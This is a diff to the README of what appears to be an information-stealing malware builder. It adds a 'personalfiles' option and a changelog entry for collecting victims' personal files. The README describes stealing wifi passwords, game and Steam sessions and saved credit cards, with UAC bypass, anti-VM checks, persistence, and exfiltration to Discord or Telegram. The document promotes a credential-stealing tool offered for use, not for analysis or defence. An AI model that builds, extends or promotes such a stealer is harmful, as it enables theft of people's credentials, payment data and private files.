@@ -19,6 +19,7 @@ webcam = False #(or true)
 blocksites = False #(or true)
 antivm = False #(or true)
 uacbypass = False #(or true)
+personalfiles = False #(or true)
 
 ```
 then type this in command prompt
@@ -49,6 +50,7 @@ https://github.com/mategol/PySilon for uac bypass
 - Gets wifi passwords (✅)
 - Gets minecraft and steam sessions (no session validating yet) (✅)
 - Gets geometry dash sessions (✅)
+- Gets Personal Files (✅)
 - Persistence (✅)
 - Webhook/Telegram Bot encryption (planned)
 - Posts info to discord/telegram
@@ -115,3 +117,6 @@ changelog 2026-07-09:
 - added support for saved credit cards
 - fixed persistence
 - webcam now uses avicap32 (ctypes) instead of cv2
+
+changelog 2026-08-02
+- added personal files collection
